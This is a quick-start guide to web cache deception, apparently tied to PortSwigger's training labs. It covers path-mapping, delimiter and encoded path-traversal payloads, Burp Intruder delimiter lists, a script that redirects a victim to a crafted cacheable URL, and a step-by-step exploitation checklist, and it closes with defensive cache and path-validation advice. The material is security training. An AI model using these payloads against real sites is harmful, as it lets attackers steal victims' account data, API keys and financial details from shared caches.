# Web Cache Deception - Quick Start Guide

## What is Web Cache Deception?

Web cache deception is a vulnerability that tricks web caches into storing sensitive, dynamic content by exploiting URL interpretation discrepancies between cache servers and origin servers.

**In simple terms:** An attacker makes a victim visit a specially crafted URL. The cache thinks it's a static file (like `.js`) and stores the response. The origin server thinks it's a dynamic page (like `/my-account`) and returns sensitive data. The attacker then accesses the cached response to steal the victim's data.

---

## 5-Minute Quick Start

### Step 1: Identify a Target Endpoint (30 seconds)

Find an endpoint that returns sensitive data when authenticated:
```
/my-account
/profile
/api/user
/settings
```

### Step 2: Test Basic Caching (1 minute)

Add a static file extension to the endpoint:
```http
GET /my-account/test.js HTTP/1.1
```

Check the response headers:
- First request: Look for `X-Cache: miss`
- Second request (within 30 seconds): Look for `X-Cache: hit`

If you see this pattern, **the endpoint is vulnerable!**

### Step 3: Craft Your Exploit (1 minute)

Create a unique URL to avoid cache collisions:
```
https://target.com/my-account/victim123.js
```

### Step 4: Deliver to Victim (2 minutes)

Use the exploit server to make the victim visit your URL:
```html
<script>
document.location="https://target.com/my-account/victim123.js"
</script>
```

### Step 5: Steal the Data (30 seconds)

Visit the same URL yourself:
```
https://target.com/my-account/victim123.js
```

The cached response will contain the victim's sensitive data!

---

## Understanding the Attack

### The Core Problem

**Different systems parse URLs differently:**

| System | Interprets | Sees |
|--------|-----------|------|
| Cache Server | `/my-account/test.js` | Static JavaScript file → **CACHE IT** |
| Origin Server | `/my-account/test.js` | Dynamic endpoint `/my-account` → **SERVE DATA** |

**Result:** Sensitive dynamic data gets cached as if it were a static file.

---

## Attack Types

### Type 1: Path Mapping (Easiest)

**When:** Origin server ignores extra path segments.

**Test:**
```http
GET /my-account/random HTTP/1.1  → Returns account data
GET /my-account/random.js HTTP/1.1  → Returns account data + gets cached!
```

**Exploit:**
```
/my-account/unique.js
/profile/data.css
/api/user/info.png
```

---

### Type 2: Delimiter Mismatch

**When:** Cache and origin recognize different delimiter characters.

**Common Delimiter:** `;` (semicolon in Java Spring)

**Test:**
```http
GET /my-account;test HTTP/1.1  → Returns account data
GET /my-account;test.js HTTP/1.1  → Returns account data + gets cached!
```

**Exploit:**
```
/my-account;unique.js
/profile:data.css
/api.user.json
```

**Delimiter List to Try:**
```
; : # ? . $ %00
```

---

### Type 3: Path Traversal (Origin Normalizes)

**When:** Origin server decodes `%2f` and resolves `..` segments; cache doesn't.

**Test:**
```http
GET /resources/..%2fmy-account HTTP/1.1
```

**What happens:**
- Cache sees: `/resources/..%2fmy-account` → Matches static directory rule
- Origin sees: `/resources/../my-account` → Resolves to `/my-account`

**Exploit:**
```
/static/..%2fprofile
/assets/..%2fapi/user
/public/..%2fmy-account
```

---

### Type 4: Path Traversal (Cache Normalizes)

**When:** Cache server decodes and normalizes; origin doesn't.

**Test:**
```http
GET /my-account%23%2f%2e%2e%2fresources HTTP/1.1
```

**What happens:**
- Origin sees: `/my-account` (stops at `%23` delimiter)
- Cache sees: `/my-account#/../resources` → Normalizes to `/resources`

**Exploit:**
```
/profile%23%2f%2e%2e%2fstatic
/api/user%23%2f%2e%2e%2fassets
```

---

## Testing Methodology

### Phase 1: Find Sensitive Endpoints

Look for endpoints that show:
- User account information
- API keys or tokens
- Personal data
- Financial information
- Private settings

**Example endpoints:**
```
/my-account
/profile
/api/me
/api/user
/api/account
/dashboard
/settings
/preferences
```

---

### Phase 2: Test for Vulnerabilities

#### Test 1: Path Abstraction
```http
GET /my-account/random HTTP/1.1
```
**Success:** Returns account data (not 404)

#### Test 2: Static Extension Caching
```http
GET /my-account/random.js HTTP/1.1
```
**Success:** `X-Cache: miss` → `X-Cache: hit` on repeat

#### Test 3: Delimiter Discovery (Use Burp Intruder)

**Setup:**
- Target: `/my-account§§test`
- Payloads: `; : . ? # $ ! @ % & * + , - = [ ] ^ _ \` { | } ~`
- Grep for: "200 OK"

**Success:** Finding delimiters that return 200

#### Test 4: Normalization
```http
GET /aaa/..%2fmy-account HTTP/1.1
GET /resources/..%2fmy-account HTTP/1.1
```
**Success:** Returns account data

---

### Phase 3: Exploit

1. **Choose working payload type** (from tests above)
2. **Add unique identifier** (avoid cache collisions)
3. **Verify it caches** (X-Cache: hit)
4. **Deliver to victim** (exploit server)
5. **Access cached response** (steal data)

---

## Burp Suite Setup

### Essential Extensions

1. **HTTP Request Smuggler** (for advanced attacks)
2. **Web Cache Deception Scanner** (automated detection)

Install via: Extender → BApp Store

---

### Repeater Configuration

For testing cache behavior:

1. Send request to Repeater (Ctrl+R)
2. **First request:** Check for `X-Cache: miss`
3. **Second request:** Send again, check for `X-Cache: hit`
4. **TTL Test:** Wait 30+ seconds, should see `miss` again

**Key Headers to Watch:**
```
X-Cache: hit/miss
Cache-Control: max-age=30
Age: 15
```

---

### Intruder Configuration for Delimiter Discovery

**Setup:**
1. Send request to Intruder (Ctrl+I)
2. Clear positions (§ Clear button)
3. Set position: `/my-account§§test`
4. Payloads tab → Load delimiter list:

```
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
:
;
<
=
>
?
@
[
\
]
^
_
`
{
|
}
~
```

5. Options → Grep Match → Add: "API Key", "Your account"
6. Start attack
7. Look for 200 responses with matches

---

## Common Payloads

### Static Extensions

Use any extension the cache treats as static:

```
.js
.css
.jpg
.png
.gif
.ico
.svg
.woff
.ttf
.json
.xml
.txt
```

**Example:**
```
/my-account/exploit.js
/profile/data.css
/api/user/info.png
```

---

### Delimiters

Framework-specific delimiters that create discrepancies:

```
/my-account;test.js      # Java Spring
/profile:data.css        # Custom frameworks
/api.user.json           # Ruby on Rails
/account#data.js         # Fragment (use %23)
/settings?info.css       # Query string
```

---

### Path Traversal

When origin normalizes:
```
/static/..%2fmy-account
/assets/..%2fprofile
/public/..%2fapi/user
/resources/..%2fsettings
```

When cache normalizes:
```
/my-account%23%2f%2e%2e%2fstatic
/profile%23%2f%2e%2e%2fassets
/api/user%23%2f%2e%2e%2fpublic
```

---

### Cache Busters

Add unique parameters to avoid collisions:

```
?victim=carlos
?id=123
?unique=abc
?timestamp=1234567890
?session=xyz
```

**Full example:**
```
/my-account/exploit.js?victim=carlos
/my-account;unique.js?id=123
/static/..%2fprofile?cache=bust
```

---

## Detection Indicators

### Vulnerable Patterns

**✓ Vulnerable:**
- Path abstraction works: `/my-account/abc` returns account data
- Static extensions cache: `X-Cache: miss` → `X-Cache: hit`
- Delimiters behave differently between systems
- Normalization discrepancies exist

**✗ Not Vulnerable:**
- Strict path matching: `/my-account/abc` returns 404
- No cache headers present
- `Cache-Control: no-store` on sensitive endpoints
- All URL interpretations match between systems

---

### Key Headers

**Cache Status:**
```http
X-Cache: hit              # Served from cache
X-Cache: miss             # Not cached
```

**Cache Configuration:**
```http
Cache-Control: max-age=30              # Cache for 30 seconds
Cache-Control: no-store                # Never cache
Cache-Control: private                 # Only client caches
Cache-Control: public                  # Any cache can store
```

**Cache Information:**
```http
Age: 15                   # Seconds in cache
Vary: Accept-Encoding     # Cache key variations
X-Served-By: cache-01     # Cache server ID
```

---

## Real-World Examples

### Example 1: E-commerce Site

**Target:** `/api/orders`

**Test:**
```http
GET /api/orders/123.json HTTP/1.1
Cookie: session=victim-token
```

**Result:**
```json
{
  "order_id": "123",
  "items": [...],
  "total": 499.99,
  "credit_card": "xxxx-xxxx-xxxx-1234"
}
```

**Impact:** Attacker can steal order details and payment information.

---

### Example 2: Social Media

**Target:** `/api/messages`

**Test:**
```http
GET /api/messages;inbox.js HTTP/1.1
Cookie: session=victim-token
```

**Result:**
```json
{
  "messages": [
    {"from": "user123", "text": "Private message..."}
  ]
}
```

**Impact:** Attacker can read private messages.

---

### Example 3: Banking Application

**Target:** `/api/account/balance`

**Test:**
```http
GET /static/..%2fapi/account/balance HTTP/1.1
Cookie: session=victim-token
```

**Result:**
```json
{
  "account_number": "987654321",
  "balance": 50000.00,
  "routing_number": "123456789"
}
```

**Impact:** Attacker gains access to financial information.

---

## Troubleshooting

### Issue: Can't See Cache Headers

**Solution:**
- Enable all headers in Burp Proxy
- Check response in Burp Repeater
- Some caches use different header names (try `CF-Cache-Status`, `X-Cache-Status`)

---

### Issue: Path Abstraction Doesn't Work

**Try:**
1. Different delimiters: `;`, `:`, `.`, `?`, `#`
2. Path traversal techniques
3. Different endpoints (API vs web routes)

---

### Issue: Nothing Gets Cached

**Check:**
- Does endpoint have `Cache-Control: no-store`?
- Are you testing with authenticated session?
- Try different static extensions
- Verify cache TTL hasn't expired

---

### Issue: Seeing Your Own Data Instead of Victim's

**Solution:**
- Use unique path/parameter per victim
- Example: `/my-account/carlos.js` for Carlos, `/my-account/wiener.js` for Wiener
- Add cache buster: `/my-account/exploit.js?victim=carlos`

---

### Issue: Lab Won't Solve

**Checklist:**
1. Delivered exploit to victim? ✓
2. Used unique payload? ✓
3. Verified caching (X-Cache: hit)? ✓
4. Accessing correct URL? ✓
5. Extracted the API key? ✓
6. Submitted solution? ✓

---

## Exploitation Checklist

### Pre-Exploitation
- [ ] Found sensitive endpoint
- [ ] Endpoint returns private data when authenticated
- [ ] Verified cache headers exist
- [ ] Mapped cache rules (extensions/directories)

### Testing
- [ ] Tested path abstraction
- [ ] Discovered working delimiters
- [ ] Verified caching behavior (miss → hit)
- [ ] Identified cache TTL

### Exploitation
- [ ] Crafted unique payload
- [ ] Tested payload caches properly
- [ ] Deployed to exploit server
- [ ] Delivered to victim
- [ ] Accessed cached response
- [ ] Extracted sensitive data

---

## Defense Quick Tips

### For Developers

**1. Set Proper Cache Headers:**
```http
Cache-Control: no-store, private
```

**2. Validate Paths Strictly:**
```python
# Bad: Abstract paths
if path.startswith("/my-account"):
    return account_data()

# Good: Exact match
if path == "/my-account":
    return account_data()
else:
    return 404
```

**3. Return 404 for Invalid Paths:**
```
/my-account/abc → 404 Not Found
/my-account;test → 404 Not Found
```

---

### For Cache Administrators

**1. Respect Cache-Control Headers**

Don't override application-set cache directives.

**2. Cache by Content-Type**

Match response `Content-Type` with request expectations:
```
Request: /file.js
Response Content-Type: application/javascript ✓ Cache
Response Content-Type: text/html ✗ Don't cache
```

**3. Enable Protection Features**

- Cloudflare: Cache Deception Armor
- Akamai: Request path validation
- Fastly: Custom VCL rules

---

## Practice Labs

Start with PortSwigger's free labs:

1. **Apprentice Level:**
   - Exploiting path mapping for web cache deception

2. **Practitioner Level:**
   - Exploiting path delimiters
   - Exploiting origin server normalization
   - Exploiting cache server normalization

3. **Advanced:**
   - HTTP request smuggling for cache deception

**Access:** https://portswigger.net/web-security/web-cache-deception

---

## Next Steps

### Beginner → Intermediate

1. Complete all PortSwigger labs
2. Practice delimiter discovery with Intruder
3. Learn URL encoding/normalization behavior
4. Study different web frameworks

### Intermediate → Advanced

1. Combine with other vulnerabilities (request smuggling)
2. Research CDN-specific behaviors
3. Develop custom exploitation scripts
4. Study cache poisoning vs deception differences

### Advanced → Expert

1. Discover new attack vectors
2. Publish research findings
3. Develop automated testing tools
4. Contribute to security community

---

## Key Takeaways

1. **Web cache deception** exploits URL parsing differences between cache and origin servers
2. **Three main techniques:** Path mapping, delimiter discrepancies, normalization differences
3. **Always use unique identifiers** to avoid cache collisions
4. **Monitor X-Cache headers** to verify caching behavior
5. **Test systematically:** Reconnaissance → Discovery → Testing → Exploitation
6. **Defense is simple:** Proper Cache-Control headers + strict path validation

---

## Quick Reference Commands

**Burp Repeater Test:**
```
1. Send request
2. Check X-Cache: miss
3. Resend
4. Verify X-Cache: hit
```

**Burp Intruder Delimiter Scan:**
```
Position: /target§§test
Payloads: ; : . ? # $ @ ! %
Grep: "200 OK"
```

**Basic Exploit:**
```html
<script>
document.location="https://target.com/endpoint/unique.js"
</script>
```

---

## Resources

- **PortSwigger Labs:** https://portswigger.net/web-security/web-cache-deception
- **Learning Path:** https://portswigger.net/web-security/learning-paths/web-cache-deception
- **Delimiter List:** https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list
- **Research:** "Gotta cache 'em all" (Black Hat USA 2024)
- **Burp Extension:** Web Cache Deception Scanner (BApp Store)

---

## Ready to Practice?

Start with the easiest lab:
**"Exploiting path mapping for web cache deception"**

1. Log in as `wiener:peter`
2. Test `/my-account/test.js`
3. Verify it caches (X-Cache: hit)
4. Craft unique URL: `/my-account/carlos-exploit.js`
5. Deliver to victim via exploit server
6. Access URL to get Carlos's API key
7. Submit solution!

Good luck! 🚀
